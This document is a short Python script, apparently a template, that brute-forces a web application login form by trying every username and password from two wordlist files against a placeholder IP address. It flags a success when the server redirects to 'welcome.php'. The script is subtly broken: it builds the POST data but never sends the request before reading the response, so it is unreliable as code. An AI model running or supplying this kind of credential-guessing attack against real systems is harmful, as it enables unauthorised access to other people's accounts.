#Script that will test a list of common usernames and passwords
#taken from a file against a web application login form.
#Make sure to make appropriate changes to variables in this script

import http.client, urllib.parse

username_file = open('{{ path_to_file }}')
password_file = open('{{ path_to_file }}')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()

        print(user, "-",pwd)

        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,'Submit': "Submit"})
        headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection("{{ IP_Address }}",80)
        response = conn.getresponse()

        if(response.getheader('location') == "welcome.php"):
            print("Logged with:",user,"-",pwd)